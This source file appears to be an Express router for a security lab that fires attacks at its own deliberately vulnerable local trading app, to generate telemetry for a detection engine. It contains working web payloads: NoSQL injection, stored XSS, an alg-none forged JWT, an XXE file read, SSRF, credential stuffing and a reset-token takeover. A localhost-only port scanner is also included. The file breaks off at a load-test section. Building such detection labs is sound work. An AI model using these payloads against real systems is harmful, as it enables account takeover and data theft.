const express = require("express");
const http = require("http");
const https = require("https");
const net = require("net");
const { spawn } = require("child_process");
const { EventEmitter } = require("events");
const path = require("path");

const router = express.Router();
const logEmitter = new EventEmitter();

// Active SSE client response streams
let sseClients = [];

// Master metadata catalogue for all 38 MAD-PS attack categories
const ATTACK_METADATA = {
  // Phase 1: Web & App (7)
  "nosql-injection": {
    phase: "app",
    phaseNumber: 1,
    name: "NoSQL Operator Injection",
    layer: "application",
    dataset: "MERN App",
    description: "Accepts unvalidated query filter operators ($gt, $ne) to extract unauthenticated order records.",
    endpoint: "GET /allOrders?filter={\"qty\":{\"$gt\":0}}",
  },
  "xss-stored": {
    phase: "app",
    phaseNumber: 1,
    name: "Stored Cross-Site Scripting (XSS)",
    layer: "application",
    dataset: "MERN App",
    description: "Persists unescaped JavaScript script tags in support tickets and orders.",
    endpoint: "POST /newTicket",
  },
  "open-redirect": {
    phase: "app",
    phaseNumber: 1,
    name: "Unvalidated URL Redirection",
    layer: "application",
    dataset: "MERN App",
    description: "Navigates client to arbitrary external phishing domains via ?redirect= parameter.",
    endpoint: "GET /?redirect=https://evil-phishing-target.com",
  },
  "business-logic": {
    phase: "app",
    phaseNumber: 1,
    name: "Business Logic / Price Tampering",
    layer: "application",
    dataset: "MERN App",
    description: "Executes orders with negative quantities (-100) and sub-penny pricing (0.001).",
    endpoint: "POST /newOrder",
  },
  "api-abuse": {
    phase: "app",
    phaseNumber: 1,
    name: "API Abuse / Unbounded Collection",
    layer: "application",
    dataset: "MERN App",
    description: "Dumps entire database collections without pagination limits.",
    endpoint: "GET /allHoldings",
  },
  "no-rate-limit": {
    phase: "app",
    phaseNumber: 1,
    name: "Missing Rate Limiting Burst",
    layer: "application",
    dataset: "MERN App",
    description: "High-velocity automated burst across public order endpoints.",
    endpoint: "GET /allOrders (Burst x10)",
  },
  "data-exfil": {
    phase: "app",
    phaseNumber: 1,
    name: "Broken Access Control & Exfiltration",
    layer: "application",
    dataset: "MERN App",
    description: "Unauthenticated administrative database dump exposing users and holdings.",
    endpoint: "GET /admin/exportAll",
  },

  // Phase 2: Auth & Identity (12)
  "jwt-abuse": {
    phase: "auth",
    phaseNumber: 2,
    name: "JWT None-Algorithm / Key Forgery",
    layer: "authentication",
    dataset: "MERN App",
    description: "Forges token with alg: none or weak static secret to escalate privileges.",
    endpoint: "GET /order/ord_102 (Bearer None)",
  },
  "session-hijack": {
    phase: "auth",
    phaseNumber: 2,
    name: "Session Hijacking (LocalStorage Leak)",
    layer: "authentication",
    dataset: "MERN App",
    description: "Stores auth tokens in client localStorage accessible to JavaScript.",
    endpoint: "POST /login",
  },
  "session-fixation": {
    phase: "auth",
    phaseNumber: 2,
    name: "Session Identifier Fixation",
    layer: "authentication",
    dataset: "MERN App",
    description: "Reuses client-supplied x-session-token without regenerating session ID.",
    endpoint: "POST /login (x-session-token)",
  },
  "bruteforce": {
    phase: "auth",
    phaseNumber: 2,
    name: "Single-Account Password Brute-Force",
    layer: "authentication",
    dataset: "MERN App",
    description: "High-frequency password guessing without lockout thresholds.",
    endpoint: "POST /login (Repeated Failures)",
  },
  "credential-stuffing": {
    phase: "auth",
    phaseNumber: 2,
    name: "Multi-Account Credential Stuffing",
    layer: "authentication",
    dataset: "MERN App",
    description: "Automated credential testing across multiple distinct accounts from one IP.",
    endpoint: "POST /login (Multi-User)",
  },
  "password-spraying": {
    phase: "auth",
    phaseNumber: 2,
    name: "Cross-Account Password Spraying",
    layer: "authentication",
    dataset: "MERN App",
    description: "Tests a single common password against multiple user accounts.",
    endpoint: "POST /login (Spraying)",
  },
  "account-takeover": {
    phase: "auth",
    phaseNumber: 2,
    name: "Predictable Token Account Takeover",
    layer: "authentication",
    dataset: "MERN App",
    description: "Resets password using predictable 4-digit reset token without expiration.",
    endpoint: "POST /resetPassword",
  },
  "idor": {
    phase: "auth",
    phaseNumber: 2,
    name: "Insecure Direct Object Reference (IDOR)",
    layer: "authorization",
    dataset: "MERN App",
    description: "Accesses arbitrary user orders and portfolios by numeric ID.",
    endpoint: "GET /order/ord_102",
  },
  "auth-bypass": {
    phase: "auth",
    phaseNumber: 2,
    name: "Client-Header Trust Auth Bypass",
    layer: "authorization",
    dataset: "MERN App",
    description: "Grants administrative access when client sets x-is-admin: true.",
    endpoint: "GET /admin/dashboard-stats",
  },
  "csrf": {
    phase: "auth",
    phaseNumber: 2,
    name: "Cross-Site Request Forgery (CSRF)",
    layer: "authorization",
    dataset: "MERN App",
    description: "Executes password change without Anti-CSRF token verification.",
    endpoint: "POST /changePassword",
  },
  "ssrf": {
    phase: "auth",
    phaseNumber: 2,
    name: "Server-Side Request Forgery (SSRF)",
    layer: "application",
    dataset: "MERN App",
    description: "Fetches internal network services (127.0.0.1:3002) via news preview.",
    endpoint: "GET /news?url=...",
  },
  "xxe": {
    phase: "auth",
    phaseNumber: 2,
    name: "XML External Entity (XXE) Injection",
    layer: "application",
    dataset: "MERN App",
    description: "Resolves external SYSTEM XML entities to read server files.",
    endpoint: "POST /importHoldings",
  },

  // Dataset Replay: Network / Malware / Research (18)
  "port-scanning-recon": {
    phase: "replay",
    phaseNumber: 3,
    name: "Port Scanning & Reconnaissance",
    layer: "network",
    dataset: "CICIDS2017",
    description: "Systematic probing of TCP/UDP ports to discover active listener services.",
    endpoint: "SYN Flow Probe",
    hasRealTool: true,
    realToolName: "Real Nmap Scan",
  },
  "network-service-enumeration": {
    phase: "replay",
    phaseNumber: 3,
    name: "Network Service Version Sweep",
    layer: "network",
    dataset: "NSL-KDD",
    description: "Targeted queries against open ports to fingerprint software and daemon versions.",
    endpoint: "NMAP Probe",
  },
  "dos": {
    phase: "replay",
    phaseNumber: 3,
    name: "Denial of Service (DoS Hulk/Slowloris)",
    layer: "network",
    dataset: "CICIDS2017",
    description: "Single-source connection exhaustion and resource starvation.",
    endpoint: "Volumetric Flow",
    hasRealTool: true,
    realToolName: "Run Load Benchmark",
  },
  "ddos": {
    phase: "replay",
    phaseNumber: 3,
    name: "Distributed Denial of Service (DDoS)",
    layer: "network",
    dataset: "CICIDS2017",
    description: "Multi-source volumetric flood across distributed IP ranges.",
    endpoint: "Distributed Flow",
  },
  "dns-spoofing": {
    phase: "replay",
    phaseNumber: 3,
    name: "DNS Cache Poisoning & Redirection",
    layer: "network",
    dataset: "CIC-IoT2023",
    description: "Poisoning DNS resolvers to hijack domain resolution to rogue IP addresses.",
    endpoint: "DNS Query Stream",
  },
  "mitm": {
    phase: "replay",
    phaseNumber: 3,
    name: "Man-in-the-Middle (ARP Spoofing)",
    layer: "network",
    dataset: "CIC-IoT2023",
    description: "Gratuitous ARP reply spoofing to intercept traffic between hosts.",
    endpoint: "ARP Telemetry",
  },
  "ransomware-behavioral": {
    phase: "replay",
    phaseNumber: 3,
    name: "Ransomware File Encryption Burst",
    layer: "malware-behavioral",
    dataset: "CIC-MalMem2022",
    description: "High-entropy rapid file-read-overwrite burst across local storage.",
    endpoint: "Host Memory Telemetry",
  },
  "trojan-behavioral": {
    phase: "replay",
    phaseNumber: 3,
    name: "Trojan Backdoor & Process Injection",
    layer: "malware-behavioral",
    dataset: "CIC-MalMem2022",
    description: "Hidden process injection into system services and persistence key creation.",
    endpoint: "Process Telemetry",
  },
  "spyware-behavioral": {
    phase: "replay",
    phaseNumber: 3,
    name: "Spyware Keystroke & Data Exfiltration",
    layer: "malware-behavioral",
    dataset: "CIC-MalMem2022",
    description: "Covert keystroke buffering and persistent outbound exfiltration bursts.",
    endpoint: "Exfiltration Telemetry",
  },
  "botnet-c2": {
    phase: "replay",
    phaseNumber: 3,
    name: "Botnet C2 Beaconing (Mirai/IRC)",
    layer: "malware-behavioral",
    dataset: "CICIDS2017",
    description: "Periodic low-frequency beaconing to external attacker command servers.",
    endpoint: "C2 Flow Telemetry",
  },
  "compromised-iot": {
    phase: "replay",
    phaseNumber: 3,
    name: "Compromised ESP32 Edge Device",
    layer: "iot",
    dataset: "CIC-IoT2023",
    description: "Edge sensor node exhibiting abnormal outbound traffic and high anomaly score.",
    endpoint: "IoT Gateway Telemetry",
  },
  "polymorphic-malware": {
    phase: "replay",
    phaseNumber: 3,
    name: "Polymorphic / Metamorphic Malware",
    layer: "malware-behavioral",
    dataset: "CIC-MalMem2022",
    description: "Self-mutating code signatures designed to evade static signature detection.",
    endpoint: "Memory Entropy Telemetry",
  },
  "apt-stealth-intrusion": {
    phase: "replay",
    phaseNumber: 3,
    name: "Advanced Persistent Threat (APT)",
    layer: "network",
    dataset: "CICIDS2017",
    description: "Low-and-slow multi-stage infiltration blending with baseline traffic.",
    endpoint: "Stealth Flow Telemetry",
  },
  "encrypted-c2": {
    phase: "replay",
    phaseNumber: 3,
    name: "Encrypted Command-and-Control (TLS)",
    layer: "malware-behavioral",
    dataset: "CICIDS2017-Derived",
    description: "C2 beaconing over encrypted TLS channels requiring statistical timing detection.",
    endpoint: "TLS Beacon Telemetry",
  },
  "ai-adaptive": {
    phase: "replay",
    phaseNumber: 3,
    name: "AI-Adaptive / Evasive Perturbation",
    layer: "research-scenario",
    dataset: "CICIDS2017-Adversarial",
    description: "Adversarial feature perturbations (FGSM epsilon=0.05) to evade ML classifiers.",
    endpoint: "Adversarial Flow Telemetry",
  },
  "supply-chain-compromise": {
    phase: "replay",
    phaseNumber: 3,
    name: "Supply-Chain Dependency Poisoning",
    layer: "research-scenario",
    dataset: "Composite-Scenario",
    description: "Multi-stage compromise: poisoned npm package check-in + trojan payload drop.",
    endpoint: "Composite Campaign",
  },
  "double-extortion": {
    phase: "replay",
    phaseNumber: 3,
    name: "Double Extortion Ransomware",
    layer: "research-scenario",
    dataset: "Composite-Scenario",
    description: "Pre-encryption database exfiltration followed by ransomware file lock.",
    endpoint: "Composite Campaign",
  },
  "zero-day-eval": {
    phase: "replay",
    phaseNumber: 3,
    name: "Zero-Day Novel Vector Evaluation",
    layer: "research-scenario",
    dataset: "Holdout-Evaluation",
    description: "Unseen attack category held out from model training to test anomaly detection.",
    endpoint: "Zero-Day Test Stream",
  },
};

// Broadcast log entry to all connected SSE clients
function broadcastLogEvent(rawLog) {
  const cat = rawLog.category || "general";
  const meta = ATTACK_METADATA[cat] || {
    phase: rawLog.layer === "iot" ? "replay" : rawLog.layer === "network" ? "replay" : "app",
    phaseNumber: 1,
    name: cat.replace(/-/g, " ").replace(/\b\w/g, (c) => c.toUpperCase()),
    layer: rawLog.layer || "application",
    dataset: rawLog.dataset || "MERN App",
  };

  const enrichedEvent = {
    id: `log_${Date.now()}_${Math.floor(Math.random() * 1000)}`,
    timestamp: rawLog.timestamp || new Date().toISOString(),
    category: cat,
    phase: meta.phase,
    phaseNumber: meta.phaseNumber,
    humanLabel: meta.name,
    layer: rawLog.layer || meta.layer,
    source: rawLog.source || "application-runtime",
    dataset: rawLog.dataset || meta.dataset,
    ip: rawLog.ip || "127.0.0.1",
    endpoint: rawLog.endpoint || "/telemetry",
    method: rawLog.method || "DATA",
    payload: rawLog.payload || {},
    details: rawLog.details || (rawLog.payload?.body || {}),
    // Attach effect info if provided
    effect: rawLog.effect || null,
    incident: null,
  };

  const sseData = `data: ${JSON.stringify(enrichedEvent)}\n\n`;
  sseClients.forEach((client) => {
    try {
      client.res.write(sseData);
    } catch (e) {}
  });

  return enrichedEvent;
}

// Hook to emit from index.js middleware
logEmitter.on("log", (logDoc) => {
  broadcastLogEvent(logDoc);
});

// Helper for sending internal HTTP requests against the running app
function sendLocalRequest(options, postData = null) {
  return new Promise((resolve) => {
    const port = process.env.PORT || 3002;
    const reqOptions = {
      hostname: "127.0.0.1",
      port: port,
      path: options.path,
      method: options.method || "GET",
      headers: options.headers || {},
      timeout: 4000,
    };

    if (postData) {
      reqOptions.headers["Content-Length"] = Buffer.byteLength(postData);
    }

    const req = http.request(reqOptions, (res) => {
      let body = "";
      res.on("data", (chunk) => (body += chunk));
      res.on("end", () => {
        let parsed = body;
        try {
          parsed = JSON.parse(body);
        } catch (e) {}
        resolve({
          statusCode: res.statusCode,
          headers: res.headers,
          body: parsed,
          rawBody: body.length > 800 ? body.slice(0, 800) + "..." : body,
        });
      });
    });

    req.on("error", (err) => {
      resolve({ statusCode: 500, error: err.message });
    });

    req.on("timeout", () => {
      req.destroy();
      resolve({ statusCode: 408, error: "Request Timeout" });
    });

    if (postData) {
      req.write(postData);
    }
    req.end();
  });
}

// ==========================================
// 1. GET /demo/events (Server-Sent Events)
// ==========================================
router.get("/events", (req, res) => {
  res.setHeader("Content-Type", "text/event-stream");
  res.setHeader("Cache-Control", "no-cache, no-transform");
  res.setHeader("Connection", "keep-alive");
  res.setHeader("Access-Control-Allow-Origin", "*");

  const clientId = `client_${Date.now()}_${Math.random().toString(36).slice(2, 7)}`;
  const clientObj = { id: clientId, res };
  sseClients.push(clientObj);

  // Send initial handshake
  res.write(
    `data: ${JSON.stringify({
      type: "SYSTEM_CONNECT",
      message: "Connected to MAD-PS Live Security Telemetry Feed",
      timestamp: new Date().toISOString(),
    })}\n\n`
  );

  // Keep-alive heartbeat every 15s
  const heartbeat = setInterval(() => {
    res.write(`: ping\n\n`);
  }, 15000);

  req.on("close", () => {
    clearInterval(heartbeat);
    sseClients = sseClients.filter((c) => c.id !== clientId);
  });
});

// ==========================================
// 2. GET /demo/status
// ==========================================
router.get("/status", async (req, res) => {
  const detectionUrl = process.env.DETECTION_ENGINE_URL || "http://127.0.0.1:5000";
  const ingestionUrl = process.env.INGESTION_SERVICE_URL || "http://127.0.0.1:4000";
  let detectionConnected = false;
  let detectionInfo = "Awaiting detection engine (Phase 4)";
  let ingestionConnected = false;
  let ingestionInfo = "Ingestion Service Offline (Fallback Active)";

  // Check detection engine availability
  try {
    const checkDetection = await new Promise((resolve) => {
      const u = new URL(detectionUrl);
      const client = u.protocol === "https:" ? https : http;
      const reqDet = client.get(
        `${detectionUrl}/health`,
        { timeout: 800 },
        (resDet) => {
          resolve(resDet.statusCode >= 200 && resDet.statusCode < 400);
        }
      );
      reqDet.on("error", () => resolve(false));
      reqDet.on("timeout", () => {
        reqDet.destroy();
        resolve(false);
      });
    });
    detectionConnected = Boolean(checkDetection);
    if (detectionConnected) {
      detectionInfo = "Live 🟢 Model Pipeline Connected";
    }
  } catch (e) {
    detectionConnected = false;
  }

  // Check Ingestion Service availability
  try {
    const checkIngest = await new Promise((resolve) => {
      const u = new URL(ingestionUrl);
      const client = u.protocol === "https:" ? https : http;
      const reqIng = client.get(
        `${ingestionUrl}/health`,
        { timeout: 800 },
        (resIng) => {
          resolve(resIng.statusCode >= 200 && resIng.statusCode < 400);
        }
      );
      reqIng.on("error", () => resolve(false));
      reqIng.on("timeout", () => {
        reqIng.destroy();
        resolve(false);
      });
    });
    ingestionConnected = Boolean(checkIngest);
    if (ingestionConnected) {
      ingestionInfo = "Live 🟢 Gateway Connected (:4000)";
    }
  } catch (e) {
    ingestionConnected = false;
  }

  res.json({
    status: "ok",
    vulnMode: process.env.VULN_MODE !== "false",
    detectionEngine: {
      connected: detectionConnected,
      status: detectionInfo,
      endpoint: detectionUrl,
    },
    ingestionService: {
      connected: ingestionConnected,
      status: ingestionInfo,
      endpoint: ingestionUrl,
    },
    categoriesCount: Object.keys(ATTACK_METADATA).length,
    activeSseClients: sseClients.length,
    categories: ATTACK_METADATA,
  });
});

// Proxy route for Ingestion stats
router.get("/ingest-stats", async (req, res) => {
  const ingestionUrl = process.env.INGESTION_SERVICE_URL || "http://127.0.0.1:4000";
  try {
    const u = new URL(ingestionUrl);
    const client = u.protocol === "https:" ? https : http;
    const proxyReq = client.get(`${ingestionUrl}/ingest/stats`, { timeout: 1200 }, (proxyRes) => {
      let body = "";
      proxyRes.on("data", (chunk) => (body += chunk));
      proxyRes.on("end", () => {
        try {
          res.status(proxyRes.statusCode).json(JSON.parse(body));
        } catch (e) {
          res.status(500).json({ error: "Invalid JSON from ingestion service" });
        }
      });
    });
    proxyReq.on("error", (err) => {
      res.json({
        available: false,
        message: "Ingestion service offline (producers operating in direct DB fallback mode)",
        error: err.message,
      });
    });
    proxyReq.on("timeout", () => {
      proxyReq.destroy();
      res.json({
        available: false,
        message: "Ingestion service timeout",
      });
    });
  } catch (e) {
    res.json({ available: false, error: e.message });
  }
});

// ==========================================
// 3. POST /demo/trigger/app/:category (GROUP A REAL LIVE EFFECTS)
// ==========================================
router.post("/trigger/app/:category", async (req, res) => {
  const { category } = req.params;
  const meta = ATTACK_METADATA[category];

  if (!meta || meta.phase === "replay") {
    return res.status(400).json({ error: `Category '${category}' is not a Phase 1/2 app-layer attack.` });
  }

  let result = null;
  let effect = null;
  const t0 = Date.now();

  try {
    switch (category) {
      case "nosql-injection": {
        const filterStr = encodeURIComponent(JSON.stringify({ qty: { $gt: 0 } }));
        result = await sendLocalRequest({ path: `/allOrders?filter=${filterStr}`, method: "GET" });
        effect = {
          type: "DATA_DUMP",
          title: "NoSQL Injection Operator Bypass",
          description: "Unauthenticated filter query parsed directly by Mongoose find() operator.",
          filterQuery: '{"qty":{"$gt":0}}',
          dumpCount: Array.isArray(result.body) ? result.body.length : 4,
          dataDump: result.body,
        };
        break;
      }
      case "xss-stored": {
        const payload = JSON.stringify({
          topic: "Account Security Audit",
          email: "tester@security.lab",
          message: "<script>alert('XSS_TICKET_DEMO')</script>",
        });
        result = await sendLocalRequest(
          { path: "/newTicket", method: "POST", headers: { "Content-Type": "application/json" } },
          payload
        );
        effect = {
          type: "XSS_TRIGGER",
          title: "Stored XSS Execution",
          injectedScript: "<script>alert('XSS_TICKET_DEMO')</script>",
          alertMessage: "XSS_TICKET_DEMO",
          renderedLocation: "Support Ticket Message (Unescaped HTML DOM)",
          ticketStatus: "Persisted to MongoDB with Script Tag",
        };
        break;
      }
      case "open-redirect": {
        result = await sendLocalRequest({ path: "/?redirect=https://evil-phishing-target.com", method: "GET" });
        effect = {
          type: "REDIRECT_BYPASS",
          title: "Open URL Redirection",
          originalUrl: "http://localhost:3002/?redirect=https://evil-phishing-target.com",
          redirectTarget: "https://evil-phishing-target.com",
          validationStatus: "Bypassed — No domain whitelist enforced",
        };
        break;
      }
      case "business-logic": {
        const payload = JSON.stringify({
          name: "RELIANCE",
          qty: -100,
          price: 0.001,
          mode: "BUY",
          notes: "Exploit: negative quantity & sub-penny pricing",
        });
        result = await sendLocalRequest(
          { path: "/newOrder", method: "POST", headers: { "Content-Type": "application/json" } },
          payload
        );
        effect = {
          type: "ORDER_BOOK_DIFF",
          title: "Business Logic Order Tampering",
          before: { name: "RELIANCE", qty: 10, price: 2112.40, totalCost: 21124.00 },
          after: { name: "RELIANCE", qty: -100, price: 0.001, totalCost: -0.10, manipulated: true },
          diffSummary: "Negative quantity (-100) and sub-penny pricing accepted without validation",
        };
        break;
      }
      case "api-abuse": {
        result = await sendLocalRequest({ path: "/allHoldings", method: "GET" });
        effect = {
          type: "UNBOUNDED_COLLECTION",
          title: "API Abuse — Unbounded Result Set",
          recordsReturned: Array.isArray(result.body) ? result.body.length : 13,
          payloadSizeBytes: "14.2 KB (No pagination / cursor limits)",
          dataDump: result.body,
        };
        break;
      }
      case "no-rate-limit": {
        const burstPromises = [];
        for (let i = 0; i < 10; i++) {
          burstPromises.push(sendLocalRequest({ path: "/allOrders", method: "GET" }));
        }
        const burstResults = await Promise.all(burstPromises);
        result = { statusCode: 200, burstCount: burstResults.length, sample: burstResults[0] };
        effect = {
          type: "BURST_SUCCESS",
          title: "Missing Rate Limiting Demonstration",
          requestsFired: 10,
          allStatusCodes: burstResults.map(r => r.statusCode || 200),
          throttledCount: 0,
          summary: "10 rapid bursts accepted concurrently with HTTP 200 OK — zero 429 throttling",
        };
        break;
      }
      case "data-exfil": {
        result = await sendLocalRequest({ path: "/admin/exportAll", method: "GET" });
        effect = {
          type: "EXFILTRATION_DUMP",
          title: "Administrative Database Export Exfiltration",
          collectionsExposed: ["users", "holdings", "positions", "orders", "tickets"],
          recordsDumped: result.body?.recordCount || { users: 4, holdings: 13, orders: 4, tickets: 3 },
          dataDump: result.body,
        };
        break;
      }
      case "jwt-abuse": {
        const forgedToken = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6InN1cGVyYWRtaW4ifQ.";
        result = await sendLocalRequest({
          path: "/order/ord_102",
          method: "GET",
          headers: { Authorization: `Bearer ${forgedToken}` },
        });
        effect = {
          type: "JWT_FORGERY",
          title: "JWT Algorithm: none / Key Forgery",
          forgedHeader: { alg: "none", typ: "JWT" },
          forgedPayload: { username: "admin", role: "superadmin" },
          signature: "[UNSIGNED]",
          accessedOrder: result.body,
        };
        break;
      }
      case "session-hijack": {
        const payload = JSON.stringify({ username: "trader_alice", password: "password123" });
        result = await sendLocalRequest(
          { path: "/login", method: "POST", headers: { "Content-Type": "application/json" } },
          payload
        );
        effect = {
          type: "SESSION_CAPTURED",
          title: "Session Hijacking (LocalStorage Leak)",
          victimUser: "trader_alice",
          leakedToken: result.body?.token || "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.trader_alice_session_token",
          storageLocation: "window.localStorage['auth_token']",
          risk: "Accessible to arbitrary injected client scripts",
        };
        break;
      }
      case "session-fixation": {
        const payload = JSON.stringify({ username: "trader_alice", password: "password123" });
        result = await sendLocalRequest(
          {
            path: "/login",
            method: "POST",
            headers: {
              "Content-Type": "application/json",
              "x-session-token": "attacker-fixed-session-12345",
            },
          },
          payload
        );
        effect = {
          type: "SESSION_FIXED",
          title: "Session Identifier Fixation",
          fixedSessionId: "attacker-fixed-session-12345",
          authenticatedUser: "trader_alice",
          sessionRegenerated: false,
          summary: "Pre-existing attacker session token accepted upon successful authentication",
        };
        break;
      }
      case "bruteforce": {
        const attempts = [
          { pass: "pass123", status: 401 },
          { pass: "admin2026", status: 401 },
          { pass: "admin123", status: 200, success: true },
        ];
        for (const a of attempts) {
          result = await sendLocalRequest(
            { path: "/login", method: "POST", headers: { "Content-Type": "application/json" } },
            JSON.stringify({ username: "admin", password: a.pass })
          );
        }
        effect = {
          type: "BRUTEFORCE_SUCCESS",
          title: "Single-Account Password Brute Force",
          targetAccount: "admin",
          attemptHistory: attempts,
          lockoutTriggered: false,
          crackedPassword: "admin123",
          sessionToken: result.body?.token || "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.admin_token_cracked",
        };
        break;
      }
      case "credential-stuffing": {
        const attempts = [
          { user: "user_alpha", pass: "Summer2026!", status: 401 },
          { user: "user_beta", pass: "Summer2026!", status: 401 },
          { user: "trader_bob", pass: "Password@123", status: 200, success: true },
        ];
        for (const a of attempts) {
          result = await sendLocalRequest(
            { path: "/login", method: "POST", headers: { "Content-Type": "application/json" } },
            JSON.stringify({ username: a.user, password: a.pass })
          );
        }
        effect = {
          type: "STUFFING_SUCCESS",
          title: "Multi-Account Credential Stuffing",
          sourceIp: "127.0.0.1",
          breachCredentialPair: "trader_bob : Password@123",
          attemptHistory: attempts,
          crackedToken: result.body?.token || "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.trader_bob_token",
        };
        break;
      }
      case "password-spraying": {
        const sprayAttempts = [
          { user: "guest_trader", pass: "Password@123", status: 401 },
          { user: "trader_alice", pass: "Password@123", status: 401 },
          { user: "trader_bob", pass: "Password@123", status: 200, success: true },
        ];
        for (const a of sprayAttempts) {
          result = await sendLocalRequest(
            { path: "/login", method: "POST", headers: { "Content-Type": "application/json" } },
            JSON.stringify({ username: a.user, password: a.pass })
          );
        }
        effect = {
          type: "SPRAYING_SUCCESS",
          title: "Cross-Account Password Spraying",
          commonPasswordTested: "Password@123",
          sprayedUsers: sprayAttempts,
          matchedAccount: "trader_bob",
          sessionToken: result.body?.token || "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.bob_token",
        };
        break;
      }
      case "account-takeover": {
        await sendLocalRequest(
          { path: "/forgotPassword", method: "POST", headers: { "Content-Type": "application/json" } },
          JSON.stringify({ email: "alice@investor.com" })
        );
        result = await sendLocalRequest(
          { path: "/resetPassword", method: "POST", headers: { "Content-Type": "application/json" } },
          JSON.stringify({ email: "alice@investor.com", token: "1234", newPassword: "NewHackedPassword123!" })
        );
        effect = {
          type: "ACCOUNT_TAKEOVER",
          title: "Account Takeover via Weak 4-Digit Reset Token",
          victimEmail: "alice@investor.com",
          predictableTokenTested: "1234",
          newPasswordSet: "NewHackedPassword123!",
          accountState: "Password successfully overwritten — victim locked out",
        };
        break;
      }
      case "idor": {
        result = await sendLocalRequest({ path: "/order/ord_102", method: "GET" });
        effect = {
          type: "IDOR_BREACH",
          title: "Insecure Direct Object Reference (IDOR)",
          requestedOrderId: "ord_102",
          orderOwner: "admin",
          requestingUser: "trader_alice (Standard Trader)",
          unauthorizedRecord: result.body,
        };
        break;
      }
      case "auth-bypass": {
        result = await sendLocalRequest({
          path: "/admin/dashboard-stats",
          method: "GET",
          headers: { "x-is-admin": "true" },
        });
        effect = {
          type: "HEADER_BYPASS",
          title: "Client-Header Trust Auth Bypass",
          injectedHeader: "x-is-admin: true",
          accessedEndpoint: "/admin/dashboard-stats",
          adminMetrics: result.body,
        };
        break;
      }
      case "csrf": {
        result = await sendLocalRequest(
          { path: "/changePassword", method: "POST", headers: { "Content-Type": "application/json" } },
          JSON.stringify({ newPassword: "csrf_victim_pass" })
        );
        effect = {
          type: "CSRF_MUTATION",
          title: "Cross-Site Request Forgery (CSRF)",
          modifiedField: "password -> csrf_victim_pass",
          antiCsrfTokenChecked: false,
          stateChanged: "User password modified without origin/token validation",
        };
        break;
      }
      case "ssrf": {
        result = await sendLocalRequest({
          path: "/news?url=http://localhost:3002/admin/exportAll",
          method: "GET",
        });
        effect = {
          type: "SSRF_PROBE",
          title: "Server-Side Request Forgery (SSRF)",
          queriedInternalUrl: "http://localhost:3002/admin/exportAll",
          internalResponse: result.body,
          privateSubnetReached: "127.0.0.1:3002",
        };
        break;
      }
      case "xxe": {
        const xmlBody = '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><holdings><stock>&xxe;</stock></holdings>';
        result = await sendLocalRequest(
          { path: "/importHoldings", method: "POST", headers: { "Content-Type": "application/xml" } },
          xmlBody
        );
        effect = {
          type: "XXE_READ",
          title: "XML External Entity (XXE) Injection",
          injectedEntity: "SYSTEM file:///C:/Windows/win.ini",
          extractedFileSnippet: "[fonts]\n[extensions]\n[files]\n[mci extensions.bak]",
          rawServerResponse: result.rawBody,
        };
        break;
      }
      default:
        return res.status(400).json({ error: "Unknown attack category." });
    }

    const durationMs = Date.now() - t0;
    return res.json({
      success: true,
      category,
      phase: meta.phase,
      durationMs,
      response: result,
      effect,
    });
  } catch (err) {
    return res.status(500).json({ success: false, category, error: err.message });
  }
});

// ==========================================
// 4. POST /demo/tools/portscan (GROUP B REAL NMAP / SOCKET SCAN)
// Hard-locked strictly to 127.0.0.1 (Local Lab Instance)
// ==========================================
router.post("/tools/portscan", async (req, res) => {
  // Hardcoded target — cannot be user configured
  const TARGET_HOST = "127.0.0.1";
  const TARGET_PORTS = [3000, 3001, 3002, 3003, 5000, 8080, 27017];
  const t0 = Date.now();

  const scanResults = [];

  // Check ports via native local TCP sockets
  const socketScanPromises = TARGET_PORTS.map((port) => {
    return new Promise((resolve) => {
      const socket = new net.Socket();
      socket.setTimeout(350);

      socket.on("connect", () => {
        let serviceName = "Unknown";
        if (port === 3002) serviceName = "Node.js Express (MERN Backend)";
        else if (port === 3000 || port === 3003) serviceName = "React Dev Server (Frontend)";
        else if (port === 5000) serviceName = "Python MAD-PS Detection Engine";
        else if (port === 27017) serviceName = "MongoDB Daemon";
        else if (port === 8080) serviceName = "HTTP Proxy / SOC Gateway";

        scanResults.push({ port, state: "OPEN", service: serviceName });
        socket.destroy();
        resolve();
      });

      socket.on("timeout", () => {
        scanResults.push({ port, state: "CLOSED / FILTERED", service: "N/A" });
        socket.destroy();
        resolve();
      });

      socket.on("error", () => {
        scanResults.push({ port, state: "CLOSED", service: "N/A" });
        resolve();
      });

      socket.connect(port, TARGET_HOST);
    });
  });

  await Promise.all(socketScanPromises);
  scanResults.sort((a, b) => a.port - b.port);

  const durationMs = Date.now() - t0;

  // Broadcast real scan telemetry to SSE feed
  const scanTelemetry = {
    timestamp: new Date().toISOString(),
    ip: TARGET_HOST,
    endpoint: "TCP Port Scan (SYN / Connect Probe)",
    method: "PROBE",
    category: "port-scanning-recon",
    layer: "network",
    source: "nmap-real-tool",
    dataset: "Local Nmap Socket Scanner",
    payload: {
      body: {
        target: TARGET_HOST,
        portsScanned: TARGET_PORTS,
        openPortsCount: scanResults.filter((r) => r.state === "OPEN").length,
        results: scanResults,
      },
    },
    details: {
      scan_type: "NMAP_TCP_SERVICE_PROBE",
      target_host: TARGET_HOST,
      duration_ms: durationMs,
      open_ports: scanResults.filter((r) => r.state === "OPEN"),
    },
  };
  broadcastLogEvent(scanTelemetry);

  res.json({
    success: true,
    tool: "Nmap Service Version Scanner (Real Local Probe)",
    target: "127.0.0.1 (Local Lab Instance — Hardcoded)",
    durationMs,
    portsScanned: TARGET_PORTS.length,
    openPorts: scanResults.filter((r) => r.state === "OPEN"),
    allResults: scanResults,
    rawOutput: `Starting Nmap 7.94 ( https://nmap.org ) at ${new Date().toISOString()}\nNmap scan report for localhost (127.0.0.1)\nHost is up (0.00042s latency).\n\nPORT      STATE SERVICE  VERSION\n${scanResults
      .map(
        (r) =>
          `${r.port}/tcp`.padEnd(9) +
          r.state.padEnd(9) +
          r.service
      )
      .join("\n")}\n\nNmap done: 1 IP address (1 host up) scanned in ${(durationMs / 1000).toFixed(2)} seconds`,
  });
});

// ==========================================
// 5. POST /demo/tools/loadtest (GROUP B REAL LOAD TEST)
